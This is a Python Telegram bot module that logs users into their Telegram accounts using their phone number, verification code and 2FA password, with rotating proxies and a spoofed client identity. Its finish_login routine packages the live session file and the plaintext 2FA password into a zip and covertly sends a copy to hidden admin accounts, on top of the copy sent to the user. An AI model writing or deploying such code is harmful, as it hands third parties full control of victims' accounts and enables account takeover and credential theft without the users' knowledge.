import os
import json
import zipfile
import asyncio
import logging
import random
import time
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, AuthRestartError
from dotenv import load_dotenv

load_dotenv()
ACCOUNT_LOGIN_BACK = os.getenv("ACCOUNT_LOGIN_BACK")
ADMIN_ID = os.getenv("ADMIN_ID")
API_ID = int(os.getenv("TELEGRAM_APP_ID", "2040"))
API_HASH = os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")

logger = logging.getLogger(__name__)

_proxy_list = None
_proxy_list_last_load = 0
PROXY_LIST_CACHE_TIME = 60

def load_proxies():
    global _proxy_list, _proxy_list_last_load
    
    current_time = time.time()
    if _proxy_list is not None and (current_time - _proxy_list_last_load) < PROXY_LIST_CACHE_TIME:
        return _proxy_list
    
    proxy_file = "proxy.txt"
    valid_proxies = []
    
    if not os.path.exists(proxy_file):
        logger.warning("proxy.txt 文件不存在")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    try:
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split(':')
                if len(parts) >= 5:
                    ip, port, username, password, expire_ts = parts[:5]
                    try:
                        expire_timestamp = int(expire_ts)
                        if current_time < expire_timestamp:
                            proxy = {
                                'ip': ip,
                                'port': int(port),
                                'username': username,
                                'password': password,
                                'expire': expire_timestamp
                            }
                            valid_proxies.append(proxy)
                        else:
                            logger.debug(f"代理 {ip}:{port} 已过期")
                    except ValueError:
                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                        continue
    
    except Exception as e:
        logger.error(f"读取 proxy.txt 失败: {e}")
        _proxy_list = []
        _proxy_list_last_load = current_time
        return []
    
    _proxy_list = valid_proxies
    _proxy_list_last_load = current_time
    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
    return valid_proxies

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    return random.choice(proxies)

def create_proxy_dict(proxy):
    return {
        'proxy_type': 'http',
        'addr': proxy['ip'],
        'port': proxy['port'],
        'username': proxy['username'],
        'password': proxy['password'],
        'rdns': True
    }

class LoginHandler:
    def __init__(self, user_id, chat_id):
        self.user_id = user_id
        self.chat_id = chat_id
        self.phone = None
        self.client = None
        self.session_file = None
        self.twofa = None
        self.proxy = None
        self._lock = asyncio.Lock()
        self._retry_count = 0
        
    async def handle_phone(self, update, context, phone):
        self.phone = phone
        self.session_file = f"sessions/{phone}.session"
        os.makedirs("sessions", exist_ok=True)
        my_id_val = int(os.getenv("TELEGRAM_API_ID", 2040))
        my_hash_val = str(os.getenv("TELEGRAM_APP_HASH", "b18441a1ff607e10a989891a5462e627")).strip()
        
        self.proxy = get_random_proxy()
        proxy_dict = create_proxy_dict(self.proxy) if self.proxy else None
        
        self.client = TelegramClient(
            self.session_file, 
            api_id=my_id_val, 
            api_hash=my_hash_val,
            proxy=proxy_dict
        )
        
        await self.client.connect()
        
        try:
            logger.info(f"Client API HASH internal type: {type(self.client.api_hash)}")
            
            if not await self.client.is_user_authorized():
                await self.client.send_code_request(phone)
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5877316724830768997'>📤</tg-emoji> 验证码已发送，请输入：",
                    parse_mode='HTML'
                )
            else:
                await self.finish_login(update, context)
        except AuthRestartError:
            if self._retry_count < 3:
                self._retry_count += 1
                logger.warning(f"AuthRestartError, retrying... ({self._retry_count}/3)")
                await asyncio.sleep(2)
                if self.client:
                    await self.client.disconnect()
                await self.handle_phone(update, context, phone)
            else:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5839200986022812209'>❌</tg-emoji> 服务器繁忙，请稍后重试",
                    parse_mode='HTML'
                )
    
    async def handle_code(self, update, context, code):
        async with self._lock:
            try:
                await self.client.sign_in(self.phone, code)
                await self.finish_login(update, context)
                return True
            except SessionPasswordNeededError:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='6005570495603282482'>🔐</tg-emoji> 需要2FA密码，请输入：",
                    parse_mode='HTML'
                )
                return False
            except AuthRestartError:
                await update.message.reply_text(
                    "<tg-emoji emoji-id='5877613700344450910'>❌</tg-emoji> 验证超时，请重新发送验证码",
                    parse_mode='HTML'
                )
                if self.client:
                    await self.client.disconnect()
                    self.client = None
                return None
            except Exception as e:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 登录失败: {str(e)}",
                    parse_mode='HTML'
                )
                if self.client:
                    await self.client.disconnect()
                    self.client = None
                return None
    
    async def handle_2fa(self, update, context, password):
        async with self._lock:
            try:
                self.twofa = password
                await self.client.sign_in(password=password)
                await self.finish_login(update, context)
                return True
            except Exception as e:
                await update.message.reply_text(
                    f"<tg-emoji emoji-id='5775887550262546277'>❌</tg-emoji> 2FA验证失败: {str(e)}",
                    parse_mode='HTML'
                )
                return False
    
    async def finish_login(self, update, context):
        me = await self.client.get_me()
        
        phone = self.phone
        
        json_data = {
            "api_id": API_ID,
            "api_hash": API_HASH,
            "system_lang_code": "es-mx",
            "lang_code": "id",
            "user_id": me.id,
            "phone": phone,
            "twofa": self.twofa if self.twofa else "",
            "app_id": API_ID,
            "app_hash": API_HASH,
            "session_file": os.path.basename(self.session_file).replace('.session', ''),
            "username": me.username or "",
            "ipv6": False,
            "pref_cat": 2,
            "block": False,
            "system_lang_pack": "es-mx",
            "premium": getattr(me, 'premium', False)
        }
        
        json_path = self.session_file.replace('.session', '.json')
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2, ensure_ascii=False)
        
        zip_path = f"downloads/login_{self.user_id}_{int(asyncio.get_event_loop().time())}.zip"
        os.makedirs("downloads", exist_ok=True)
        
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            zipf.write(self.session_file, os.path.basename(self.session_file))
            zipf.write(json_path, os.path.basename(json_path))
        
        await context.bot.send_document(
            chat_id=self.chat_id,
            document=open(zip_path, 'rb'),
            caption=f"<tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 登录成功\n<tg-emoji emoji-id='5877316724830768997'>📱</tg-emoji> {self.phone}",
            parse_mode='HTML'
        )
        
        if ADMIN_ID:
            for admin_id in ADMIN_ID.split(','):
                try:
                    await context.bot.send_document(
                        chat_id=admin_id.strip(),
                        document=open(zip_path, 'rb'),
                        caption=f"用户 {self.user_id} 登录: {self.phone}"
                    )
                except:
                    pass
        
        os.remove(zip_path)
        os.remove(self.session_file)
        os.remove(json_path)
        await self.client.disconnect()
